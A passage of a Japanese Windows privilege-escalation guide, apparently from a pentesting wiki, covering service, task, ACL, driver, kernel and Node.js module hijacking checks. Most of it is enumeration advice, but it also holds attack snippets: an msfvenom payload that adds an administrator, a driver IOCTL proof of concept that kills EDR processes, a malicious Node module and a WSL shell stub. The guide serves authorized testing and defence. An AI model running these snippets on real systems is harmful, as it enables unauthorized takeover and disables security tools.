wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**metasploitでこの脆弱性を検出して悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploitでサービスバイナリを手動で作成できます:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。そのバイナリを置き換えられる場合、権限昇格が可能なことがあります。詳しくは[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプト対象

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` と同様に、**アクション引数**で指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的にファイルを渡す場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しが直接記述されている場合は、指定されたスクリプトの ACL も確認してください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトまたは親ディレクトリは、設定されたタスクのプリンシパルが呼び出し元と異なり、タスクが実際にそのアクションに到達する場合に限り、アカウント間実行の手掛かりになります。スクリプトでは追記のみの ACL も関係することがありますが、それ以前の `exit` やその他の制御フローによって、追記した行が実行されない場合があります。権限昇格を主張する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ作成時にスクリプトを変更したり、タスクを起動したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFSでは、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていることがあり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップファイルや設定ファイルのうち、関連性の高い少数のファイルについては、内容を開く前にストリームの**名前とサイズ**を確認してください。Windowsでは[`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)から、PowerShellでは[`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item)から確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルの実効読み取りアクセス権、ファイルシステムがストリームをサポートしているか、ストリームに使用可能な認証情報が含まれているか、その認証情報が実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の表示を避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことができます。特権アカウントでこのヘルパーを起動するスケジュールされたタスクまたはサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限の書き込みアクセスによって、そのアカウントのコンテキストでコマンドを実行できる可能性があります。特権アカウントで実行するものがあることと、**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールされたタスクの場合は、アクションの[`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory)と、2つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力を読み取る証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たす必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして権限昇格できる場合があります）と**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復パス

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置換に失敗した場合に、既存の書き込み保護されたファイルを実行していた旧バージョンの Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている正確なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようなブランチだけの表示では、影響の有無を判断できません。列挙では、ファイルの作成や agent コマンドの実行を行わずに、バージョン、サービスの状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus の SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、ADSelfService Plus のビルド 6210 以前に影響し、ベンダーはビルド 6211 で修正しました。SAML SSO が**現在または過去に**有効だった場合に限り、関連します。そのため、インストール済み製品のエントリやサービスパスは調査の手がかりであって、脆弱性の判定材料ではありません。正確なビルド、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM での実行には、SYSTEM として実行されるインスタンスが必要です。製品の Backup ディレクトリに読み取り可能な `OfflineBackup_*.ezip` があれば、それは別の暗号化バックアップに関する手がかりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権を記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows Jenkins controller では、ジョブの作成・設定権限と、ジョブの起動権限を区別してください。[Jenkins はこれらを別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として説明しています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド経路になる場合もありますが、有効になっていて、実際にビルドが実行されることを確認してください。実行時の ID は controller または選択された agent のものとなり、保存された認証情報を利用できるのは、そのジョブが認証情報のスコープにアクセスできる場合に限られます。別途、`JENKINS_HOME` のメタデータへのアクセスを調べてください。Jenkins は認証情報の素材と暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins の秘密情報ストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけでは、パスワードが判明するわけではありません。共有出力に秘密情報を表示せず、**必要なファイルへの読み取りアクセス権**と、別途成立するアカウント再利用経路を確認してください。そのアカウントが AD ユーザーオブジェクトの `scriptPath` に対する書き込み権限を持つ場合は、書き込み可能なスクリプトパスに加えて、対象ユーザーとして動作する実際のログオン処理またはスケジュールされた実行主体があることを確認してから、ユーザー間実行と判断してください。さらにグループを制御できるかどうかは、実効 AD 権限を別途検証する必要があります。

#### Azure Pipelines self-hosted agent の ID

Azure DevOps Server または Azure Pipelines のプロジェクトでは、パイプラインの**作成・編集**権限と、パイプラインを**キューに登録**して選択した agent pool を使う権限を分けて確認してください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[プールの認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)をそれぞれ説明しています。権限の低いアカウントがスクリプトステップを送信し、そのパイプラインを self-hosted Windows agent 上で実行できる場合、そのステップは[agent に設定されたオペレーティングシステムのアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への移行を主張する前に、対象のパイプライン、ブランチやリソースの制限、認可されたプール、実行可能なジョブ、agent のサービス ID を確認してください。agent のインストール、プロジェクトのロール、リポジトリへの書き込み権限だけでは、手がかりにすぎません。受動的な列挙では、ビルドを開始せずに権限とローカルのサービスメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL データベースにアクセスする **ADSync サービスアカウント**と、ディレクトリ権限が設定済みの同期機能によって異なる **AD DS connector アカウント**を区別しています。connector の認証情報はデータベース内に暗号化して保存され、キー素材は[ADSync サービスアカウントの下で DPAPI により保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者らしいグループがあること、またはデータベースを閲覧できることだけでは、復号可能な認証情報やドメイン権限昇格が成立するとは限りません。実際のデータベース読み取り権限、サービスアカウントとキーへのアクセス、インストール先と SQL の構成、設定済みの connector ID、その ID の実効 AD 権限をそれぞれ確認してください。通常の列挙ではサービスとアクセスのメタデータのみを表示し、保存された秘密情報を照会したり表示したりしないでください。

#### プリンタードライバーのサポート DLL 権限

インストール済みのプリンタードライバーは、サポート DLL を `C:\ProgramData` 配下に保持し、より高い権限を持つ印刷プロセスで読み込む場合があります。プリンターの WMI 列挙が拒否される場合でも、親ディレクトリや reparse point を含め、該当するドライバーディレクトリと DLL の ACL を確認してください。[Ricoh プリンタードライバーの問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` です。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL 読み込みが説明されています。書き込み可能な ACL は手がかりにすぎません。拒否エントリを考慮した実効書き込み権限、該当ドライバーがインストールされていて、特権 ID の下でそのファイルを読み込むこと、ベンダーの更新済みドライバーまたはセキュリティプログラムによってインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから、脆弱性があると判断しないでください。

### 書き込み権限

特別なファイルを読み取れるように設定ファイルを変更できないか、または管理者アカウントによって実行されるバイナリ（schedtasks）を変更できないか確認してください。

システム上の権限が弱いフォルダーやファイルを見つける方法は、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ プラグインの自動読み込みを利用した永続化/実行

Notepad++ は、`plugins` サブフォルダー内のプラグイン DLL を自動的に読み込みます。書き込み可能なポータブル版/コピー版がある場合、悪意のあるプラグインを配置するだけで、`notepad++.exe` 内で起動のたびにコードを自動実行できます（`DllMain` やプラグインのコールバックからも実行可能です）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーが実行するレジストリまたはバイナリを上書きできるか確認してください。**\
**権限昇格につながる興味深い autoruns の場所について、詳しくは** **次のページ** **を読んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーを探します。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

関連する Windows kernel-exploitation の資料：

user-writable な read/write register を使う kernel-mode ring-buffer の事例については、[USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming)を参照してください。

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

脆弱な呼び出しが attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使う）ことで、時間枠を数マイクロ秒から数十マイクロ秒まで延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、単体では弱い2つの bug から構築できるものがあります。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation が leak する **lock-release-before-copy** disclosure です。<sup>[[29]](#references)</sup>

監査と exploitation に関するメモ：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行するパターンを探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの attacker-controlled な paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload とサイズを制御でき、後で pipe の read/peek operation で調べられるため有用です。解放された object に list link が含まれる場合は、これらを user memory 内にある **fake request node の循環リスト**で上書きし、元の list head で終了させず、ドライバーに attacker-defined な request structure を繰り返し処理させます。
- **予測可能な write を強化する**：fake request により、bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を変更できる場合、**書き込み先アドレスは制御できるが、値は制御できない** kernel write を得られる可能性があります。その場合は、最終的な code/data pointer ではなく、sprayed pool object の **length/size** field を狙い、その後 spray を列挙して、破損した object から **out-of-bounds paged-pool read** を実現します。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者がコピーされる buffer を大きくできる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、コピーにかかる時間が長くなって replacement window が広がるため、マシンをクラッシュさせずに信頼性を高められます。
- **Pointer-rich refill targets**：Windows **I/O ring** の registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。array を1つ leak し、周囲の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、後続の I/O ring operation に attacker-forged な entry を使わせ、arbitrary kernel read/write を実現できます。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14`）しか生成できない場合は、**unaligned write の重ね合わせ**で `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を構築し、`VirtualAlloc` で map した上で、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグに役立つ指標：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive ワークフローを使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子孫キーを悪用して、カスタムドライバーなしでメタデータの破損を kernel paged-pool overflow に変換できます。ここで一連の手順を確認してください。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスを起点とした `RtlQueryRegistryValues` の direct-mode 型混同

一部のドライバーは userland からレジストリパスを受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を呼び出し、`RTL_QUERY_REGISTRY_DIRECT` で `int readValue` などのスタック上のスカラーに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、レジストリの**実際の**型に従って解釈されます。

これにより、次の2つの有用なプリミティブが得られます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な絶対パス `\Registry\...` を使うと、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログからキーの存在を漏らし、場合によっては呼び出し元が直接アクセスできない値を読み取れます。
- **Kernel memory corruption**: `&readValue` のようなスカラーの宛先は、レジストリ値の型に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして型混同されます。

実践的な exploit の注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で**信頼されていない hive**を照会すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。exploit 可能性を保つには、`HKCU` に値を配置するのではなく、**信頼されたシステム hive 内の攻撃者が書き込み可能なキー**を探してください。
- **信頼された hive への値の配置**: NtObjectManager を使って `\Registry\Machine` 配下にある書き込み可能な子孫キーを列挙し、複製した**低整合性**token でもスキャンを再実行して、sandbox 化されたコンテキストからアクセス可能なキーを探します:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`への8-byteの直接書き込みは、隣接するスタックデータを破損させ、近くのコールバック／関数ポインターを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードがまず攻撃者制御の`REG_DWORD`をスタック上のスカラーに読み込み、その後、同じバッファを文字列の読み込みに再利用すると、攻撃者が`Length` / `MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、ある程度制御可能なカーネル書き込みが発生します。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`にある最初の`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリは攻撃者のバイト列を隣接するスタックスロットに直接コピーします。これは、多くの場合、コールバックポインターを完全に上書きする最も容易な方法です。

強力な調査パターン: **再初期化せずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みを行うかどうかが決まるコードパスを検索してください。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPENの未設定を悪用する（LPE + EDR kill）

署名済みのサードパーティ製ドライバーの中には、IoCreateDeviceSecureで強固なSDDLを設定してデバイスオブジェクトを作成しながら、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れるものがあります。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスを開く際にセキュアDACLが適用されません。そのため、権限のないユーザーでも、次のような名前空間パスを使ってハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際に確認された事例）

ユーザーがデバイスを開けると、ドライバーが公開する特権IOCTLを悪用して、LPEや改ざんを実行できます。実環境で確認された機能の例:
- 任意のプロセスへのフルアクセスハンドルの返却（トークン窃取 / DuplicateTokenEx/CreateProcessAsUserによるSYSTEMシェル）。
- 制限のないraw diskの読み書き（オフラインでの改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、カーネル経由でユーザーランドからAV/EDR killが可能になります。

最小限のPoCパターン（ユーザーモード）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLによる制限を意図したデバイスオブジェクトを作成する場合は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTLs（アクセスマスク、METHOD_*、入力検証）を制限し、カーネルの特権を直接使う代わりに、ブローカー経由のモデルを検討する。

防御側向けの検知アイデア
- 不審なデバイス名（例：\\ .\\amsdk*）をユーザーモードから開く動作や、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストを維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダーへの書き込み権限**がある場合、プロセスが読み込む DLL をハイジャックし、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス権を確認します。

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決のハイジャック

これは **Windows uncontrolled search path** の亜種で、`require("foo")` のような bare import を実行した際に、想定されるモジュールが **見つからない** 場合に **Node.js** と **Electron** アプリケーションに影響します。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリの `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートまで到達する可能性があります。そのため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を順に確認することがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**高権限の Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行される場合、昇格されたスケジュールタスク／サービスラッパーから実行される場合、または特権を持つデスクトップアプリとして自動起動される場合は、**LPE** につながります。

特に、次のようなケースでよく見られます。

- 依存関係が `optionalDependencies` で宣言されている<sup>[[22]](#references)</sup>
- サードパーティーライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- 本番ビルドからパッケージが削除されている、パッケージング時に含まれていない、またはインストールに失敗している
- 脆弱な `require()` がアプリケーションのメインコードではなく、依存関係ツリーの奥深くにある

### 脆弱なターゲットの調査

Procmon を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` が `node_modules` を `contains` する条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功した open に注目する

展開済みの `.asar` ファイルやアプリケーションのソースで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmonまたはソースの確認から、**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、root lookup directoryを作成します。

```powershell
mkdir C:\node_modules
```

3. 期待される名前と完全に一致する名前でモジュールを配置する:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者アプリケーションを起動します。アプリケーションが `require("foo")` を試み、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込むことがあります。

このパターンに当てはまる、実際に見られる不足しているオプションモジュールの例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な**テクニック**は、特権で動作する Windows の Node/Electron プロセスが解決する、任意の**不足しているベアインポート**を見つけることです。

### 検出とハードニングのアイデア

- ユーザーによる `C:\node_modules` の作成や、新しい `.js` ファイル／パッケージの書き込みを検知する。
- 高整合性プロセスが `C:\node_modules\*` から読み込んでいないか調査する。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査する。
- サードパーティコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認する。
- ライブラリが対応している場合は、オプションのプローブを無効にする（たとえば、一部の `ws` 環境では `WS_NO_UTF_8_VALIDATE=1` により、レガシーな `utf-8-validate` のプローブを回避できる）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

hosts fileにハードコードされている、ほかの既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースとDNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセス所有者、実行ファイルのパス、およびそれを起動するサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるのは、その認証とコマンド制御が許可している場合に限られます。より高い権限を持つアカウントで実行されるカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手掛かりにすぎません。認証を経たメモリ破損の経路を確認するには、その正確なバイナリと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合は、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP テーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォールのルール

[**ファイアウォール関連のコマンドはこちらのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

rootユーザーを取得すると、任意のポートでlistenできます（初めて `nc.exe` でポートをlistenするときは、ファイアウォールで `nc` を許可するかどうかをGUIで確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

`--default-user root` を使用すると、bash を root として簡単に起動できます。

`WSL` のファイルシステムは、フォルダー `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で確認できます。

